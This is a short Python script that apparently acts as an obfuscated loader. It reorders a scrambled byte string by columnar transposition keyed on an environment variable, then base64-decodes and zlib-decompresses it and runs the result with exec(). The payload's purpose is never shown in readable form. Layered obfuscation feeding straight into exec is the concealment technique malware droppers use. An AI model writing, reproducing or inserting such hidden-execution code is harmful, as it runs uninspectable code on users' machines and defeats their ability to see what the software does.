import os
_columns = int(os.environ.get('PYDECOMP_COLUMNS', '7'))
_s = b'eKtgdslWJNrcm+8CRcFCB=Jh9TjGKqiOP76tr4anp/3wDxE4I/K2FE6zqbmX+NGbtAXTghLYoYIq55ix8ImtujQbvzGscAxW2jhmw9ps2JDAuAcNBJjS0vKAXNcS4OPEPgBWrn+D9s7/CTgB6/GA'
_rows = -(-len(_s) // _columns)
_short = _rows * _columns - len(_s)
_out = bytearray(len(_s))
_at = 0
for _c in range(_columns):
    _length = _rows - (1 if _c >= _columns - _short else 0)
    for _r in range(_length):
        _out[_r * _columns + _c] = _s[_at]
        _at += 1
exec(__import__('zlib').decompress(__import__('base64').b64decode(bytes(_out))))
